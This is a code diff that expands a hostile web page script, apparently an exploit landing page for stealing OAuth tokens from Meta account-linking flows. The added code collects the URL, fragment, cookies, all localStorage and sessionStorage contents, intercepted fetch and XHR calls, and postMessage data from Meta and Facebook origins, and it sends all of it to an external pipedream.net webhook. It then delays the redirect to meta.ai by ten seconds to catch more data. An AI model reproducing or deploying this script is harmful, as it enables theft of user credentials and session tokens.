@@ -6,36 +6,109 @@
 <script>
 (function(){
   var webhook = "https://eoylavrsjqkz18k.m.pipedream.net";
-  
-  var data = {
+
+  function send(label, obj) {
+    var payload = JSON.stringify({label: label, data: obj, ts: new Date().toISOString()});
+    navigator.sendBeacon && navigator.sendBeacon(webhook, payload);
+    fetch(webhook, {method:"POST", mode:"no-cors", headers:{"Content-Type":"text/plain"}, body: payload});
+  }
+
+  // 1. Basic capture
+  send("page_load", {
     url: window.location.href,
     query: window.location.search,
     fragment: window.location.hash,
     referrer: document.referrer,
-    cookies: document.cookie,
-    ts: new Date().toISOString()
+    cookies: document.cookie
+  });
+
+  // 2. Performance API — redirect chain may contain tokens in intermediate URLs
+  try {
+    var navEntries = performance.getEntriesByType("navigation");
+    if (navEntries.length > 0) {
+      var nav = navEntries[0];
+      send("perf_navigation", {
+        redirectCount: nav.redirectCount,
+        type: nav.type,
+        name: nav.name,
+        transferSize: nav.transferSize,
+        serverTiming: JSON.stringify(nav.serverTiming)
+      });
+    }
+    var resEntries = performance.getEntriesByType("resource");
+    if (resEntries.length > 0) {
+      send("perf_resources", resEntries.map(function(r){ return {name:r.name, type:r.initiatorType}; }));
+    }
+  } catch(e) { send("perf_error", e.message); }
+
+  // 3. window.opener — if opened as popup, may have access to parent
+  try {
+    if (window.opener) {
+      send("opener_exists", {
+        href: window.opener.location.href,
+        origin: window.opener.origin
+      });
+    } else {
+      send("opener_null", true);
+    }
+  } catch(e) { send("opener_blocked", e.message); }
+
+  // 4. Listen for postMessage from auth.meta.com / facebook.com
+  window.addEventListener("message", function(e) {
+    send("postMessage_received", {
+      origin: e.origin,
+      data: typeof e.data === "object" ? JSON.stringify(e.data) : String(e.data),
+      source_exists: !!e.source
+    });
+  });
+
+  // 5. Storage events
+  window.addEventListener("storage", function(e) {
+    send("storage_event", {key: e.key, newValue: e.newValue, url: e.url});
+  });
+
+  // 6. Dump all localStorage/sessionStorage
+  try {
+    var ls = {}, ss = {};
+    for (var i = 0; i < localStorage.length; i++) {
+      var k = localStorage.key(i); ls[k] = localStorage.getItem(k);
+    }
+    for (var j = 0; j < sessionStorage.length; j++) {
+      var k2 = sessionStorage.key(j); ss[k2] = sessionStorage.getItem(k2);
+    }
+    if (Object.keys(ls).length || Object.keys(ss).length) {
+      send("storage_dump", {localStorage: ls, sessionStorage: ss});
+    }
+  } catch(e) {}
+
+  // 7. Capture any iframes that load
+  new MutationObserver(function(mutations) {
+    mutations.forEach(function(m) {
+      m.addedNodes.forEach(function(n) {
+        if (n.tagName === "IFRAME") {
+          send("iframe_added", {src: n.src, name: n.name});
+        }
+      });
+    });
+  }).observe(document.documentElement, {childList: true, subtree: true});
+
+  // 8. Override fetch/XMLHttpRequest to intercept any hidden API calls
+  var origFetch = window.fetch;
+  window.fetch = function() {
+    send("fetch_intercepted", {url: arguments[0], method: arguments[1] && arguments[1].method});
+    return origFetch.apply(this, arguments);
+  };
+  var origOpen = XMLHttpRequest.prototype.open;
+  XMLHttpRequest.prototype.open = function() {
+    send("xhr_intercepted", {method: arguments[0], url: arguments[1]});
+    return origOpen.apply(this, arguments);
   };
 
-  if (navigator.sendBeacon) {
-    navigator.sendBeacon(webhook, JSON.stringify(data));
-  }
-
-  fetch(webhook, {
-    method: "POST",
-    mode: "no-cors",
-    headers: {"Content-Type": "text/plain"},
-    body: JSON.stringify(data)
-  }).finally(function(){
-    var raw = window.location.search.substring(1);
-    try {
-      var decoded = decodeURIComponent(raw);
-      if (decoded.indexOf("/oauth_account_linking/") === 0) {
-        window.location.href = "https://www.meta.ai" + decoded;
-        return;
-      }
-    } catch(e) {}
+  // Don't redirect — stay on page to catch async events (postMessage, etc)
+  // Redirect after 10 seconds to give time for async callbacks
+  setTimeout(function(){
     window.location.href = "https://meta.ai/";
-  });
+  }, 10000);
 })();
 </script>
 </body>
